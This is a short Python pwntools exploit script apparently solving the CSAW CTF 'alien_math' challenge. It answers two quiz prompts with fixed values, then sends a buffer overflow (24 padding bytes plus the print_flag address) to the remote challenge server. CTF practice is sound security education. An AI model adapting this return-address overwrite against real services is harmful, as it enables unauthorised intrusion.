#!/usr/bin/env python3

from socket import recv_fds
from pwn import *

context.binary = binary = '/home/mckenziepepper/Documents/b0f-chals/CSAW/alien_math'
math_elf = ELF(binary)
context.log_level = 'debug'
printFlag = p64(math_elf.symbols.print_flag)
OFFSET = 24
junk = b"A" * OFFSET

while True:
    p = remote('pwn.chal.csaw.io', 5004, ssl=False)
    #p = process('/home/mckenziepepper/Documents/b0f-chals/CSAW/alien_math')

    guess1 = b"1804289383"
    p.sendlineafter("What is the square root of zopnol?", guess1)
    leak = p.recvuntil("!\n")
    log.info(f"{leak = }")
    if b"Correct!\n" in leak:
        False
        guess2 = b"7856445899213065428791" #------> What we want to make: 7759406485255323229225
        p.sendlineafter("How many tewgrunbs are in a qorbnorbf?", guess2)
        #leak = p.recvuntil("You get a C. No flag this time.\n") ------> Debugging purposes
        leak = p.recvuntil("Genius! One question left...\n")
        log.info(f"{leak = }")
        if b"\nGenius!" in leak:
            False
            payload = [
                junk,
                printFlag,
            ]

            payload = b''.join(payload)
            p.sendline(payload)
            p.interactive()
        else:
            p.kill()
    else:
        p.kill()
